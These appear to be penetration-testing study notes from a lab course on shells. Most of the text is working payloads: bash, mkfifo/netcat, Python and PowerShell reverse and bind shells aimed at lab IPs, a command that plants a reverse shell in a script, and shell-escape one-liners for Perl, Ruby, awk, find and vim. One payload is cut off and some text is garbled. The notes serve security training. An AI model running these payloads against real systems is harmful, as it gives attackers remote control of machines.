Related Articles: 
Tags: #Maneuvers

---

#### ðŸ“š Definition:
A shell is a tool, a software that we use to communicate with the device via command lines. Shells are terminals and there are more types of shells, e.g. Bash, Zsh, Powershell, etc...

There are 3 connection methods for shells:

| **Type**         | **Method**                                             |
| ---------------- | ------------------------------------------------------ |
| *Reverse Shells* | Connects back to our system                            |
| *Bind Shells*    | Waits for us to connect to the system                  |
| *Web Shells*     | Communicates through a web server over HTTP parameters |

---
### ðŸ’€ Reverse Shells:

Reverse shells are the most common shell method in penetration testing. 
In order for a reverse shell to succeed we need to, first set-up a listener on a given port on our machine, so that the target machine can connect to us.

We accomplish this by leveraging tools such as netcat, ncat, nc:
```bash
0xCZR@htb[/htb]$ nc -lvnp 1234
listening on [any] 1234 ...
```

The flag -lvnp states:

| **Flag** | **Description**                                                 |
| -------- | --------------------------------------------------------------- |
| *-l*     | Stands for listen-mode                                          |
| *-v*     | Stands for verbose-mode                                         |
| *-n*     | Stands for DNS resolution skip, it will connect directly via IP |
| *-p*     | Stands for port (sets the diven port on listening mode)         |
Also, we have to know our IP so that we can specify the right IP for the connection.
We can do this by leveraging internal tools such as ifconfig, ip a, ipconfig, etc...

####  ðŸ’€Useful Reverse Shell CommandsðŸ’€:

The command we use to initiate the reverse shell communication is totally dependent on the system we interact with. 
For example a Windows Reverse Shell will be a different command than a Linux one or a Web one, etc...

A really valuable asset to have in your inventory is: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

---
#### Linux - Bash (/dev/tcp): 

```bash
'bash -c "bash -i >& /dev/tcp/10.13.13.54/9999 0>&1"'
```

This particular one is setting up a connection through /dev/tcp/ method which is a file used in UNIX-LIKE system for communication over TCP for shells:

- `bash -c`; will execute a command through bash.

- `bash -i >&`; will initialize bash and send all the output to the shell with >&.

- `/dev/tcp`; is a file used by UNIX like systems in communication over shells.

- `0>&1`:  This redirects the standard input (`stdin`, file descriptor `0`) to come from the same place as the standard output (`stdout`, file descriptor `1`). Why: This setup allows the attacker to send input (commands) to the shell from their machine. The commands are sent through the TCP connection, received by the shell, and executed.

---
#### Linux - Bash (mkfifo):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.13.54 2222 >/tmp/f
```

This particular one is setting up a connection through pipe method:
- `rm /tmp/f`; First it will remove any pipe called f so it will not duplicate itself.

- `mkfifo /tmp/f`; Then it will make a named pipe(FIFO) /tmp/f. A named pipe is used for inter-process communication. In this case, it will be used to redirect input and output between processes.

- `cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234`; this is the actual reverse shell initiation. It will cat the contents of /tmp/f pipe the output to the /bin/sh and -i initialize a shell, 2>&1 will send all the errors to the same shell output, so both the standard ok and errors are printed. And then it will pipe the output to a nc connection.

- `/tmp/f`; will finish the loop.

---

#### Powershell:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```


---

## Bind Shell

Another type of shell is aÂ `Bind Shell`. Unlike aÂ `Reverse Shell`Â that connects to us, we will have to connect to it on theÂ `targets'`Â listening port.

Once we execute aÂ `Bind Shell Command`, it will start listening on a port on the remote host and bind that host's shell, i.e.,Â `Bash`Â orÂ `PowerShell`, to that port. We have to connect to that port withÂ `netcat`, and we will get control through a shell on that system.

---

#### Bind Shell Command

Once again, we can utilizeÂ [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)Â to find a proper command to start our bind shell.

Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.

The following are reliable commands we can use to start a bind shell:

Code:Â bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Code:Â python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Code:Â powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.sta
```
There 


`"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.201 4444 >/tmp/f"`

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.201 4445 >/tmp/f' | tee -a monitor.sh

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://highon.coffee/blog/reverse-shell-cheat-sheet/


---

# BIND Shells

Setting up a listener:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
Connecting to it:
```bash
nc -nv 10.129.41.200 7777
```


---

# Reverse Shells

# Powershell:

```powershell

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.137', 4443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()


```


---

# Interactive Shells
# UNIX:

## /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

#### Interactive

Â Â Spawning Interactive Shells

```bash
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

---

## Perl

If the programming languageÂ [Perl](https://www.perl.org/)Â is present on the system, these commands will execute the shell interpreter specified.

#### Perl To Shell

Â Â Spawning Interactive Shells

```perl
perl â€”e 'exec "/bin/sh";'
```

Â Â Spawning Interactive Shells

```perl
perl: exec "/bin/sh";
```

The command directly above should be run from a script.

---

## Ruby

If the programming languageÂ [Ruby](https://www.ruby-lang.org/en/)Â is present on the system, this command will execute the shell interpreter specified:

#### Ruby To Shell

Â Â Spawning Interactive Shells

```ruby
ruby: exec "/bin/sh"
```

The command directly above should be run from a script.

---

## Lua

If the programming languageÂ [Lua](https://www.lua.org/)Â is present on the system, we can use theÂ `os.execute`Â method to execute the shell interpreter specified using the full command below:

#### Lua To Shell

Â Â Spawning Interactive Shells

```lua
lua: os.execute('/bin/sh')
```

The command directly above should be run from a script.```

## AWK

[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html)Â is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below:

#### AWK To Shell

Â Â Spawning Interactive Shells

```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

---

## Find

[Find](https://man7.org/linux/man-pages/man1/find.1.html)Â is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.

#### Using Find For A Shell

Â Â Spawning Interactive Shells

```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

This use of the find command is searching for any file listed after theÂ `-name`Â option, then it executesÂ `awk`Â (`/bin/awk`) and runs the same script we discussed in the awk section to execute a shell interpreter.

---

## Using Exec To Launch A Shell

Â Â Spawning Interactive Shells

```shell-session
find . -exec /bin/sh \; -quit
```

This use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly. IfÂ `find`Â can't find the specified file, then no shell will be attained.

---

## VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editorÂ `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

#### Vim To Shell

Â Â Spawning Interactive Shells

```shell-session
vim -c ':!/bin/sh'
```

#### Vim Escape

Â Â Spawning Interactive Shells

```shell-session
vim
:set shell=/bin/sh
:shell
```